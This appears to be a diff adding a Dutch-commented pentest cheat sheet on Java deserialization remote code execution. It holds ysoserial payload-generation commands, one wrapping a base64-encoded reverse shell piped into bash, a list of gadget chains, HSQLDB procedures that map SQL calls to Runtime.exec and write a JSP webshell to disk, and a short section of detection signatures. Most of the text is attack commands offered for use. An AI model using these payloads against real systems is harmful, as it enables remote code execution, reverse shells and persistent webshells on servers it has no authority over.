@@ -1,0 +1,28 @@
+# Java Deserialization RCE
+# === ysoserial payload generatie ===
+java -jar ysoserial.jar CommonsCollections1 'id' > payload.bin
+java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}' > payload.bin
+# Base64 variant:
+java -jar ysoserial.jar CommonsCollections1 'id' | base64
+# === Veelgebruikte gadget chains ===
+# CommonsCollections1-7 (Apache Commons Collections)
+# Spring1-4 (Spring Framework)
+# Groovy1 (Groovy)
+# JRMPClient/Listener (RMI)
+# Hibernate1 (Hibernate)
+# === Detectie ===
+# Zoek naar: ObjectInputStream.readObject()
+# Magic bytes in data: AC ED 00 05 (Java serialized object)
+# Base64 encoded: rO0ABQ
+# Content-Type: application/x-java-serialized-object
+# === HSQLDB Java Language Routines (via XXE/SQLi) ===
+# Maak Java procedure:
+CREATE PROCEDURE exec_cmd(IN cmd VARCHAR) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME 'CLASSPATH:java.lang.Runtime.exec'
+# Schrijf webshell via Java utils:
+CREATE PROCEDURE write_file(IN path VARCHAR, IN data VARBINARY(65535)) LANGUAGE JAVA DETERMINISTIC NO SQL EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
+CALL write_file('/path/shell.jsp', CAST('webshell_hex' AS VARBINARY(65535)))
+# === Tools ===
+# ysoserial: https://github.com/frohoff/ysoserial
+# JNDI-Exploit-Kit: Log4Shell style JNDI injection
+# marshalsec: voor verschillende marshal formats
+# Tip: Check classpath voor beschikbare gadgets (pom.xml, lib/ directory)
